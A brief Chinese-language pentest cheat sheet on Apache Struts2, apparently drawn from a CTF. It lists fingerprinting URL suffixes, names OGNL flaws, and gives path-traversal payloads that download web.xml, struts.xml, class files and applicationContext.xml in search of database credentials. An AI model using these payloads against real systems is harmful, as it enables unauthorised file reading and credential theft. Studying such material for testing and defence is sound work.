特征
/index.action
.do
.action
.do.cn.ction
.xhtml
.shtml

漏洞：

s2-052，namespace处插入OGNL代码引发的漏洞。
S2-013，链接标签带入参数时导致的OGNL解析漏洞
S2-012，链接标签带入参数时导致的OGNL解析漏洞

^
一般工具都能一把梭。综合工具abc_123编写的，B站搜希水函一讲堂，可以看使用教程。


^
## **struts2任意文件读取后利用**

常规，发现是struts
```
../../WEB-INF/web.xml
```


^
struts.xml是struts2的核心配置文件，在开发过程中利用率最高。该文件主要负责管理应用中的Action映射，以及该Action包含的Result定义等。
读取struts.xml
```
?fileName=../../WEB-INF/classes/struts.xml
```
同样根据映射下载
```
?fileName=../../WEB-INF/classes/com/cuitctf/action/UserLoginAction.class

类中引用类，同样下载
../../WEB-INF/classes/com/cuitctf/service/UserService.class

?fileName=../../WEB-INF/classes/com/cuitctf/util/InitApplicationContext.class
```

下载配置文件
```
?fileName=../../WEB-INF/classes/applicationContext.xml
?fileName=../../WEB-INF/classes/user.hbm.xml
```

最终可能找到数据库配置文件，数据库sql，存在sql注入等